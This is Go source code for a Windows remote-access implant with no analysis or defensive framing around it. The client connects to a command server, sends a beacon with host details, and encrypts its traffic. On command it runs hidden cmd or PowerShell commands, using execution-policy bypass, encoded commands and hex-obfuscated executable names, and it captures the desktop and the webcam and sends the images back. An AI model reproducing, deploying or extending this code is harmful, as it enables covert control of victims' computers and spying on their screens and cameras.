package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"image"
	"image/color"
	"image/png"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"

	"golang.org/x/crypto/pbkdf2"
	"golang.org/x/sys/windows"
)

var (
	CVER            string = "0.2.0"
	TYPE            string = "go"
	chunkSize       int    = 1024
	client          net.Conn
	sessionId       string
	logStream       *log.Logger
	logEnabled      bool      = true
	address         string    = "localhost"
	port            string    = "54678"
	startTime       time.Time = time.Now().UTC()
	exitProcess     bool      = false
	sentFirstBeacon bool      = false

	retryIntervals = []int{
		10000,
		30000,
		(1 * 60 * 1000),
		(2 * 60 * 1000),
		(4 * 60 * 1000),
		(6 * 60 * 1000),
	}

	mutex sync.Mutex

	avicap32                = windows.NewLazySystemDLL("avicap32.dll")
	capCreateCaptureWindowA = avicap32.NewProc("capCreateCaptureWindowA")

	user32           = windows.NewLazySystemDLL("user32.dll")
	getDC            = user32.NewProc("GetDC")
	releaseDC        = user32.NewProc("ReleaseDC")
	closeClipboard   = user32.NewProc("CloseClipboard")
	getClipboardData = user32.NewProc("GetClipboardData")
	openClipboard    = user32.NewProc("OpenClipboard")
	getSystemMetrics = user32.NewProc("GetSystemMetrics")
	sendMessageA     = user32.NewProc("SendMessageA")

	kernel32     = windows.NewLazySystemDLL("kernel32.dll")
	globalLock   = kernel32.NewProc("GlobalLock")
	globalUnlock = kernel32.NewProc("GlobalUnlock")

	gdi32                  = windows.NewLazySystemDLL("gdi32.dll")
	createCompatibleDC     = gdi32.NewProc("CreateCompatibleDC")
	deleteDC               = gdi32.NewProc("DeleteDC")
	createCompatibleBitmap = gdi32.NewProc("CreateCompatibleBitmap")
	selectObject           = gdi32.NewProc("SelectObject")
	bitBlt                 = gdi32.NewProc("BitBlt")
	deleteObject           = gdi32.NewProc("DeleteObject")
	getDIBits              = gdi32.NewProc("GetDIBits")
)

const (
	WM_CAP_DRIVER_CONNECT    = 0x0400 + 10
	WM_CAP_DRIVER_DISCONNECT = 0x0400 + 11
	WM_CAP_EDIT_COPY         = 0x0400 + 30
	WM_CAP_SET_PREVIEW       = 0x0400 + 50
	WM_CAP_GRAB_FRAME        = 0x0400 + 60

	CF_DIB = 8

	SM_CXSCREEN = 0
	SM_CYSCREEN = 1
	SRCCOPY     = 0x00CC0020
)

type (
	BITMAPINFO struct {
		BmiHeader BITMAPINFOHEADER
		BmiColors [1]RGBQUAD
	}
	BITMAPINFOHEADER struct {
		BiSize          uint32
		BiWidth         int32
		BiHeight        int32
		BiPlanes        uint16
		BiBitCount      uint16
		BiCompression   uint32
		BiSizeImage     uint32
		BiXPelsPerMeter int32
		BiYPelsPerMeter int32
		BiClrUsed       uint32
		BiClrImportant  uint32
	}
	RGBQUAD struct {
		RgbBlue     byte
		RgbGreen    byte
		RgbRed      byte
		RgbReserved byte
	}
)

func InitLogging() error {
	if !logEnabled {
		return nil
	}
	logDir := "logs"
	logFilePath := filepath.Join(logDir, "client.log")
	if err := os.MkdirAll(logDir, 0755); err != nil {
		logEnabled = false
		return fmt.Errorf("failed to create log directory: %v", err)
	}
	file, err := os.OpenFile(logFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		logEnabled = false
		return fmt.Errorf("failed to open log file: %v", err)
	}
	logStream = log.New(file, "", log.LstdFlags|log.Lshortfile)
	return nil
}

func WriteLog(message string, v ...any) {
	if !logEnabled || logStream == nil {
		return
	}
	if len(v) > 0 {
		message = fmt.Sprintf(message, v...)
	}
	logStream.Printf("%s\n", message)
}

func GetSessionID(conn net.Conn) error {
	netAddress := conn.LocalAddr()
	ipAddress := netAddress.String()

	// Handle special case for loopback address
	if strings.Contains(ipAddress, "::1") {
		ipAddress = "127.0.0.1"
	} else {
		ipAddress = strings.Split(ipAddress, ":")[0]
	}
	WriteLog("IP Address: %s", ipAddress)
	sumIp := 0
	if strings.Contains(ipAddress, ".") {
		// Compute sum of IP address parts
		parts := strings.Split(ipAddress, ".")
		for _, part := range parts {
			partInt, err := strconv.Atoi(part)
			if err != nil {
				return fmt.Errorf("failed to convert IP address part to integer: %w", err)
			}
			sumIp += partInt
		}
	}

	// Prepare data for hashing
	data := fmt.Sprintf("%s<>%d", ipAddress, sumIp)

	// Create SHA-256 hash
	hash := sha256.New()
	_, err := hash.Write([]byte(data))
	if err != nil {
		return fmt.Errorf("failed to write data to hash: %w", err)
	}
	hashBytes := hash.Sum(nil)

	// Convert hash to hexadecimal and truncate to 32 characters
	sessionId = hex.EncodeToString(hashBytes)[:32]
	WriteLog("Session ID: %s", sessionId)
	return nil
}

func EncryptData(data []byte, sharedKey string) (string, error) {
	// Generate a random salt
	salt := make([]byte, 32)
	if _, err := io.ReadFull(rand.Reader, salt); err != nil {
		return "", fmt.Errorf("failed to generate salt: %w", err)
	}

	// Derive a key from the shared key and salt
	key := pbkdf2.Key([]byte(sharedKey), salt, 200000, 32, sha512.New)

	// Generate a random IV (nonce)
	iv := make([]byte, 12)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return "", fmt.Errorf("failed to generate IV: %w", err)
	}

	// Create AES cipher block
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", fmt.Errorf("failed to create cipher block: %w", err)
	}

	// Create GCM cipher
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", fmt.Errorf("failed to create GCM: %w", err)
	}

	// Encrypt the data
	ciphertext := gcm.Seal(nil, iv, data, nil)

	// Extract the authentication tag (last 16 bytes)
	authTag := ciphertext[len(ciphertext)-16:]

	// Exclude the authentication tag from ciphertext for encoding
	ciphertext = ciphertext[:len(ciphertext)-16]

	// Encode components to base64
	saltB64 := base64.StdEncoding.EncodeToString(salt)
	ivB64 := base64.StdEncoding.EncodeToString(iv)
	authTagB64 := base64.StdEncoding.EncodeToString(authTag)
	ciphertextB64 := base64.StdEncoding.EncodeToString(ciphertext)

	// Return the encrypted data in the format: salt:iv:authTag:ciphertext
	return fmt.Sprintf("%s:%s:%s:%s", saltB64, ivB64, authTagB64, ciphertextB64), nil
}

func DecryptData(encrypted, sharedKey string) (string, error) {
	// Split the encrypted string into components
	parts := strings.Split(encrypted, ":")
	if len(parts) != 4 {
		return "", fmt.Errorf("invalid encrypted data format")
	}

	// Decode base64 encoded components
	salt, err := base64.StdEncoding.DecodeString(parts[0])
	if err != nil {
		return "", fmt.Errorf("failed to decode salt: %w", err)
	}
	iv, err := base64.StdEncoding.DecodeString(parts[1])
	if err != nil {
		return "", fmt.Errorf("failed to decode IV: %w", err)
	}
	authTag, err := base64.StdEncoding.DecodeString(parts[2])
	if err != nil {
		return "", fmt.Errorf("failed to decode auth tag: %w", err)
	}
	ciphertext, err := base64.StdEncoding.DecodeString(parts[3])
	if err != nil {
		return "", fmt.Errorf("failed to decode ciphertext: %w", err)
	}

	// Derive the key from the shared key and salt
	key := pbkdf2.Key([]byte(sharedKey), salt, 200000, 32, sha512.New)

	// Create AES cipher block
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", fmt.Errorf("failed to create cipher block: %w", err)
	}

	// Create GCM cipher
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", fmt.Errorf("failed to create GCM: %w", err)
	}

	// Add the auth tag to the ciphertext (AES-GCM includes auth tag in ciphertext)
	fullCiphertext := append(ciphertext, authTag...)

	// Decrypt the data
	plaintext, err := gcm.Open(nil, iv, fullCiphertext, nil)
	if err != nil {
		return "", fmt.Errorf("decryption failed: %w", err)
	}

	return string(plaintext), nil
}

func GetRetryInterval(retries int) int {
	if retries < len(retryIntervals) {
		return retryIntervals[retries]
	}
	return 0
}

func SendCommand(response interface{}) {
	jsonData, err := json.Marshal(response)
	if err != nil {
		WriteLog("Failed to marshal response: %v", err)
		return
	}

	encrypted, err := EncryptData(jsonData, sessionId)
	if err != nil {
		WriteLog("Failed to encrypt data: %v", err)
		return
	}

	encryptedBytes := []byte(encrypted)
	totalLength := len(encryptedBytes)
	chunk := make([]byte, chunkSize+7) // Account for --FIN-- at the end

	if totalLength > chunkSize {
		for i := 0; i < totalLength; i += chunkSize {
			end := i + chunkSize
			if end > totalLength {
				end = totalLength
			}

			// Copy the chunk of data
			copy(chunk[:end-i], encryptedBytes[i:end])

			// Append --FIN-- if this is the last chunk
			if end == totalLength {
				copy(chunk[end-i:], []byte("--FIN--"))
				WriteLog("Sent Chunk: %s", string(chunk[:end-i+len("--FIN--")]))
				if _, err := client.Write(chunk[:end-i+len("--FIN--")]); err != nil {
					WriteLog("Failed to write chunk with FIN to client: %w", err)
					return
				}
			} else {
				WriteLog("Sent Chunk: %s", string(chunk[:end-i]))
				if _, err := client.Write(chunk[:end-i]); err != nil {
					WriteLog("Failed to write chunk to client: %w", err)
					return
				}
			}
		}
	} else {
		WriteLog("Sent Data: %s", encrypted)
		if _, err := client.Write(encryptedBytes); err != nil {
			WriteLog("Failed to write data to client: %w", err)
			return
		}
	}
}

func SendBeacon() error {
	maj, min, patch := windows.RtlGetNtVersionNumbers()
	osver := fmt.Sprintf("%d.%d.%d", maj, min, patch)
	hostname, err := os.Hostname()
	if err != nil {
		return fmt.Errorf("failed to get hostname: %v", err)
	}
	SendCommand(map[string]interface{}{
		"response": map[string]interface{}{
			"beacon":   true,
			"version":  CVER,
			"type":     TYPE,
			"platform": runtime.GOOS,
			"arch":     runtime.GOARCH,
			"osver":    osver,
			"hostname": hostname,
		},
	})
	return nil
}

func Sleep(ms int) {
	time.Sleep(time.Duration(ms) * time.Millisecond)
}

func utf8To16(str string) []byte {
	utf16Codes := utf16.Encode([]rune(str))
	buffer := make([]byte, len(utf16Codes)*2)
	for i, code := range utf16Codes {
		buffer[i*2] = byte(code)
		buffer[i*2+1] = byte(code >> 8)
	}
	return buffer
}

func FormatFileName(name, extension string) string {
	now := time.Now()
	year := now.Year()
	month := fmt.Sprintf("%02d", now.Month())
	day := fmt.Sprintf("%02d", now.Day())
	hours := fmt.Sprintf("%02d", now.Hour())
	minutes := fmt.Sprintf("%02d", now.Minute())
	seconds := fmt.Sprintf("%02d", now.Second())
	ext := strings.TrimPrefix(extension, ".")
	return fmt.Sprintf("%s_%d-%s-%s_%s-%s-%s.%s", name, year, month, day, hours, minutes, seconds, ext)
}

func CaptureWebcam() ([]byte, error) {
	windowName, err := windows.UTF16PtrFromString("WebcamCapture")
	if err != nil {
		return nil, fmt.Errorf("failed to convert window name: %v", err)
	}
	handle, _, err := capCreateCaptureWindowA.Call(
		uintptr(unsafe.Pointer(windowName)),
		0, 0, 0, 320, 240, 0, 0)
	if handle == 0 {
		return nil, fmt.Errorf("failed to create capture window: %v", err)
	}
	defer sendMessageA.Call(handle, WM_CAP_DRIVER_DISCONNECT, 0, 0)
	ret, _, err := sendMessageA.Call(handle, WM_CAP_DRIVER_CONNECT, 0, 0)
	if ret == 0 {
		return nil, fmt.Errorf("failed to connect to driver: %v", err)
	}
	sendMessageA.Call(handle, WM_CAP_SET_PREVIEW, 1, 0)
	sendMessageA.Call(handle, WM_CAP_GRAB_FRAME, 0, 0)
	sendMessageA.Call(handle, WM_CAP_EDIT_COPY, 0, 0)
	img, err := GetImageFromClipboard()
	if err != nil {
		return nil, fmt.Errorf("failed to get image from clipboard: %v", err)
	}
	var buf bytes.Buffer
	err = png.Encode(&buf, img)
	if err != nil {
		return nil, fmt.Errorf("failed to encode image as PNG: %v", err)
	}
	return buf.Bytes(), nil
}

func CaptureDesktop() ([]byte, error) {
	// Check if procedures are properly loaded
	if getDC == nil || releaseDC == nil || createCompatibleDC == nil || deleteDC == nil ||
		createCompatibleBitmap == nil || selectObject == nil || bitBlt == nil || getSystemMetrics == nil ||
		deleteObject == nil || getDIBits == nil {
		return nil, fmt.Errorf("one or more GDI32 procedures are not found")
	}

	screenDC, _, err := getDC.Call(0)
	if screenDC == 0 {
		return nil, fmt.Errorf("GetDC failed: %v", err)
	}
	defer releaseDC.Call(screenDC, screenDC)

	hdcMem, _, err := createCompatibleDC.Call(screenDC)
	if hdcMem == 0 {
		return nil, fmt.Errorf("CreateCompatibleDC failed: %v", err)
	}
	defer deleteDC.Call(hdcMem)

	screenWidth, _, err := getSystemMetrics.Call(SM_CXSCREEN)
	if screenWidth == 0 {
		return nil, fmt.Errorf("GetSystemMetrics for width failed: %v", err)
	}

	screenHeight, _, err := getSystemMetrics.Call(SM_CYSCREEN)
	if screenHeight == 0 {
		return nil, fmt.Errorf("GetSystemMetrics for height failed: %v", err)
	}

	bitmap, _, err := createCompatibleBitmap.Call(screenDC, screenWidth, screenHeight)
	if bitmap == 0 {
		return nil, fmt.Errorf("CreateCompatibleBitmap failed: %v", err)
	}
	defer deleteObject.Call(bitmap)

	oldBitmap, _, err := selectObject.Call(hdcMem, bitmap)
	if oldBitmap == 0 {
		return nil, fmt.Errorf("SelectObject failed: %v", err)
	}
	defer selectObject.Call(hdcMem, oldBitmap)

	ret, _, err := bitBlt.Call(hdcMem, 0, 0, screenWidth, screenHeight, screenDC, 0, 0, SRCCOPY)
	if ret == 0 {
		return nil, fmt.Errorf("BitBlt failed: %v", err)
	}

	img, err := bitmapToImage(hdcMem, screenWidth, screenHeight)
	if err != nil {
		return nil, fmt.Errorf("failed to convert bitmap to image: %v", err)
	}

	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		return nil, fmt.Errorf("failed to encode image as PNG: %v", err)
	}

	return buf.Bytes(), nil
}

func bitmapToImage(hdcMem, width, height uintptr) (image.Image, error) {
	// Define BITMAPINFO structure
	bmi := BITMAPINFO{
		BmiHeader: BITMAPINFOHEADER{
			BiSize:        uint32(unsafe.Sizeof(BITMAPINFOHEADER{})),
			BiWidth:       int32(width),
			BiHeight:      int32(-height), // Negative height for top-down DIB
			BiPlanes:      1,
			BiBitCount:    24,
			BiCompression: 0,
		},
	}

	// Determine the size of the bitmap data
	var bmpSize uint32
	_, _, err := getDIBits.Call(hdcMem, 0, 0, 0, uintptr(unsafe.Pointer(&bmi)), 0, uintptr(unsafe.Pointer(&bmpSize)))
	if err != nil || bmpSize == 0 {
		return nil, fmt.Errorf("failed to get bitmap data size: %v", err)
	}

	// Allocate buffer for bitmap data
	data := make([]byte, bmpSize)

	// Get bitmap data
	_, _, err = getDIBits.Call(hdcMem, 0, 0, uintptr(height), uintptr(unsafe.Pointer(&bmi)), uintptr(unsafe.Pointer(&data[0])), 0)
	if err != nil {
		return nil, fmt.Errorf("failed to get bitmap data: %v", err)
	}

	// Create a new RGBA image
	img := image.NewRGBA(image.Rect(0, 0, int(width), int(height)))

	// Calculate row size in bytes, padded to a multiple of 4 bytes
	rowSize := (width*3 + 3) &^ 3

	// Copy data into image
	for y := 0; y < int(height); y++ {
		for x := 0; x < int(width); x++ {
			offset := (y*int(rowSize) + x*3)
			r := data[offset+2]
			g := data[offset+1]
			b := data[offset]
			img.Set(x, int(height)-y-1, color.RGBA{R: r, G: g, B: b, A: 255})
		}
	}

	return img, nil
}

// Retrieves an image from the clipboard.
func GetImageFromClipboard() (image.Image, error) {
	ret, _, _ := openClipboard.Call(0)
	if ret == 0 {
		return nil, fmt.Errorf("failed to open clipboard")
	}
	defer closeClipboard.Call()

	handle, _, _ := getClipboardData.Call(CF_DIB)
	if handle == 0 {
		return nil, fmt.Errorf("failed to get clipboard data")
	}

	ptr, _, _ := globalLock.Call(handle)
	if ptr == 0 {
		return nil, fmt.Errorf("failed to lock global memory")
	}
	defer globalUnlock.Call(handle)

	bitmapInfo := (*BITMAPINFO)(unsafe.Pointer(ptr))
	width := int(bitmapInfo.BmiHeader.BiWidth)
	height := int(bitmapInfo.BmiHeader.BiHeight)

	// Ensure the height is positive and compute row padding
	if height < 0 {
		height = -height
	}
	rowSize := (width*3 + 3) &^ 3

	// Calculate the offset of bitmap data
	dataOffset := uintptr(bitmapInfo.BmiHeader.BiSize) + uintptr(bitmapInfo.BmiHeader.BiClrUsed)*unsafe.Sizeof(RGBQUAD{})
	dataPtr := uintptr(ptr) + dataOffset

	// Create a new image
	img := image.NewRGBA(image.Rect(0, 0, width, height))

	// Copy the data into the image
	for y := 0; y < height; y++ {
		srcOffset := dataPtr + uintptr(y)*uintptr(rowSize)
		dstOffset := y * img.Stride
		// Ensure to copy only the size of one row
		copy(img.Pix[dstOffset:dstOffset+rowSize], (*[1 << 30]byte)(unsafe.Pointer(srcOffset))[:rowSize])
	}

	return img, nil
}

func RunCommand(command string, payload string, isFile bool) (string, error) {
	if strings.TrimSpace(command) == "" {
		return "", errors.New("no command provided")
	}
	if command != "cmd" && command != "ps" {
		return "", errors.New("unsupported command")
	}

	var args []string
	switch command {
	case "cmd":
		if strings.Contains(payload, ";") || strings.Contains(payload, "&") {
			return "", errors.New("invalid characters in payload")
		}
		args = []string{"/c", payload}
		command = "\x63\x6d\x64\x2e\x65\x78\x65" // "cmd.exe"
	case "ps":
		args = []string{
			"-NonInteractive",
			"-NoLogo",
			"-NoProfile",
			"-WindowStyle", "Hidden",
			"-ExecutionPolicy", "Bypass",
		}
		if isFile {
			args = append(args, "-File", payload)
		} else {
			encodedCmd := base64.StdEncoding.EncodeToString(utf8To16(payload))
			args = append(args, "-EncodedCommand", encodedCmd)
		}
		command = "\x70\x6f\x77\x65\x72\x73\x68\x65\x6c\x6c\x2e\x65\x78\x65" // "powershell.exe"
	}

	cmd := exec.Command(command, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Start()
	if err != nil {
		WriteLog("Failed to start command: %s", err.Error())
		return "", err
	}

	done := make(chan error, 1)
	go func() {
		done <- cmd.Wait()
	}()

	select {
	case <-time.After(30 * time.Second):
		if err := cmd.Process.Kill(); err != nil {
			WriteLog("Failed to kill process: %v", err)
			return "", fmt.Errorf("failed to kill process: %v", err)
		}
		return "", errors.New("command timed out")
	case err := <-done:
		if err != nil {
			WriteLog("Command failed: %v. Error output: %s", err, stderr.String())
			return "", fmt.Errorf("command failed: %v. Error output: %s", err, stderr.String())
		}
	}

	return stdout.String(), nil
}

func GetUptime() string {
	currentTime := time.Now()
	uptimeMillis := currentTime.Sub(startTime).Milliseconds()
	totalSeconds := uptimeMillis / 1000
	days := totalSeconds / 86400
	hours := (totalSeconds % 86400) / 3600
	minutes := (totalSeconds % 3600) / 60
	seconds := totalSeconds % 60
	return fmt.Sprintf("%dd %dh %dm %ds", days, hours, minutes, seconds)
}

func ParseAction(action string) error {
	action = strings.TrimSpace(action)
	re := regexp.MustCompile(`(?:(?:"(?:\\.|[^"\\])*")|(?:\S+))`)
	parts := re.FindAllString(action, -1)
	if len(parts) < 1 {
		return fmt.Errorf("command unrecognized")
	}
	command := parts[0]
	properties := parts[1:]
	WriteLog("Command: %s - Properties: %s", command, strings.Join(properties, " "))
	switch command {
	case "ps", "cmd":
		if len(properties) > 0 {
			payloadBytes, err := base64.StdEncoding.DecodeString(properties[0])
			if err != nil {
				return fmt.Errorf("error decoding base64: %v", err)
			}
			payload := string(payloadBytes)
			result, err := RunCommand(command, payload, false)
			if err != nil {
				return fmt.Errorf("error in RunCommand: %v", err)
			}
			SendCommand(map[string]interface{}{
				"response": map[string]interface{}{
					"data": result,
				},
			})
		}
	case "up":
		SendCommand(map[string]interface{}{
			"response": map[string]interface{}{
				"data": GetUptime(),
			},
		})
		return nil
	case "di":
		exitProcess = true
		if client != nil {
			client.Close()
		}
		WriteLog("Exiting process.")
		os.Exit(0)
	case "ss":
		result, err := CaptureDesktop()
		if err != nil {
			return fmt.Errorf("error capturing screenshot: %v", err)
		}
		SendCommand(map[string]interface{}{
			"response": map[string]interface{}{
				"data":     result,
				"download": FormatFileName("ss", "png"),
			},
		})
		return nil
	case "wc":
		img, err := CaptureWebcam()
		if err != nil {
			return fmt.Errorf("error capturing webcam clip: %v", err)
		}
		SendCommand(map[string]interface{}{
			"response": map[string]interface{}{
				"data":     img,
				"download": FormatFileName("wc", "png"),
			},
		})
		return nil
	default:
		return fmt.Errorf("command unrecognized")
	}
	return nil
}

func HandleConnection(conn net.Conn) {
	defer conn.Close() // Ensure the connection is closed when done

	reader := bufio.NewReader(conn)
	var buffer bytes.Buffer
	var data []byte

	for {
		if exitProcess {
			WriteLog("Exiting connection handler.")
			return
		}

		// Set a read deadline to prevent blocking indefinitely
		conn.SetReadDeadline(time.Now().Add(10 * time.Second)) // Increased deadline for stability

		chunk := make([]byte, chunkSize+7) // account for --FIN-- on ending chunks
		n, err := reader.Read(chunk)
		if err != nil {
			if err == io.EOF {
				WriteLog("Connection closed by server")
				return
			}
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				// This is just a timeout, not a real error
				continue
			}
			WriteLog("Error reading from connection: %v", err)
			return
		}

		if n > 0 {
			index := bytes.Index(buffer.Bytes(), []byte("--FIN--"))

			if n >= chunkSize || index != -1 {
				// chunk mode
				buffer.Write(chunk[:n])
				if index != -1 {
					buffer.Next(index + len([]byte("--FIN--"))) // --FIN-- length
					data = buffer.Bytes()
				}
			} else {
				// non chunk mode
				data = make([]byte, n)
				copy(data, chunk[:n])
			}

			if len(data) > 0 {
				// Ensure we do not panic when slicing data
				dataStr := string(data)
				if len(dataStr) > 100 {
					WriteLog("Received data: %s", dataStr[:100])
				} else {
					WriteLog("Received data: %s", dataStr)
				}

				action, err := DecryptData(dataStr, sessionId)
				if err != nil {
					WriteLog("DecryptData error: %v", err)
				} else if action != "" {
					if err := ParseAction(action); err != nil {
						WriteLog("Error parsing action: %v", err)
					}
				}
			}
		}
	}
}

func ConnectToServer() {
	for !exitProcess {
		mutex.Lock()
		if client == nil {
			conn, err := net.Dial("tcp", address+":"+port)
			if err != nil {
				WriteLog("Connection error: %v", err)
				mutex.Unlock()
				time.Sleep(5 * time.Second) // Wait before retrying
				continue
			}
			client = conn
			WriteLog("Client connected.")
		}
		mutex.Unlock()

		if sessionId == "" {
			if err := GetSessionID(client); err != nil {
				WriteLog("Error getting SessionID: %v", err)
			}
		}

		if !sentFirstBeacon {
			if err := SendBeacon(); err != nil {
				WriteLog("Error sending beacon: %v", err)
			} else {
				sentFirstBeacon = true
			}
		}

		HandleConnection(client)

		if !exitProcess {
			WriteLog("Connection lost. Attempting to reconnect...")
			client = nil                // Reset client to trigger reconnection
			time.Sleep(5 * time.Second) // Wait before reconnecting
			continue
		}
	}
	WriteLog("Connection to server closing.")
}

func main() {
	err := InitLogging()
	if err != nil {
		log.Panicf("Logging error: %v", err)
	}

	go ConnectToServer()

	// Set up a channel to listen for interrupt signals
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	// Wait for an interrupt signal
	<-sigChan

	// Set exitProcess to true to stop the connection loop
	exitProcess = true

	// Close the client connection if it's open
	if client != nil {
		client.Close()
	}
}
